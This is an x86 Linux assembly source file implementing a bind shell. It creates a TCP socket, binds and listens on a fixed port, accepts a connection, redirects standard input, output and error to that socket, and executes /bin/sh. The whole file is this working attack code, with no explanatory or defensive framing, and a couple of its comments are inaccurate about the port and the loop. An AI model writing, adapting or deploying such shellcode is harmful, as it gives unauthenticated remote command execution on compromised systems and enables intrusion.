.include "defines.h"

BIND_PORT	= 0xfe00	// 255

.data
SOCK:
	.long 	0x0
LEN:	
	.long	0x10
SHELL:
	.string "/bin/sh"

.text
.globl _start
_start:
	subl	$0x20,%esp 

//	socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	movl	$SYS_socketcall,%eax
	movl	$SYS_socketcall_socket,%ebx
	movl	$AF_INET,(%esp)
	movl	$SOCK_STREAM,0x4(%esp)
	movl 	$IPPROTO_TCP,0x8(%esp)
	movl	%esp,%ecx
	int	$0x80

// 	save sockfd
	movl	%eax,SOCK

	xorl	%edx,%edx
//	bind(%eax, %esp+0xc, 0x10);
	movw	$AF_INET,0xc(%esp)
	movw	$BIND_PORT,0xe(%esp)
	movl	%edx,0x10(%esp)
	movl	%eax,(%esp)
	leal	0xc(%esp),%ebx
	movl	%ebx,0x4(%esp)
	movl	$0x10,0x8(%esp)
	movl	$SYS_socketcall,%eax
	movl	$SYS_socketcall_bind,%ebx
	int 	$0x80

	movl	SOCK,%eax	

//	listen(%eax, 0x1);
	movl	%eax,(%esp)
	movl	$0x1,0x4(%esp)
	movl	$SYS_socketcall,%eax
	movl	$SYS_socketcall_listen,%ebx
	int 	$0x80

	movl	SOCK,%eax

//	accept(%eax, %esp+0xc, $LEN);	
	movl	%eax,(%esp)
	leal	0xc(%esp),%ebx
	movl	%ebx,0x4(%esp)
	movl	$LEN,0x8(%esp)
	movl	$SYS_socketcall,%eax
	movl	$SYS_socketcall_accept,%ebx
	int	$0x80

//	for(i=2;i>-1;;i--) dup2(%eax,i)
	movl	$0x2,%ecx
DUP2LOOP:
	pushl	%eax
	movl	%eax,%ebx
	movl	$SYS_dup2,%eax
	int	$0x80
	dec	%ecx
	popl	%eax
	jns	DUP2LOOP

//	execve($SHELL, { $SHELL, NULL }, NULL );
	movl	$SYS_execve,%eax
	movl	$SHELL,%ebx
	movl	%ebx,(%esp)
	movl	%edx,0x4(%esp)
	movl	%esp,%ecx
	int	$0x80

//	_exit(0)
	movl	$SYS_exit,%eax
	movl	%edx,%ebx
	int	$0x80

	ret
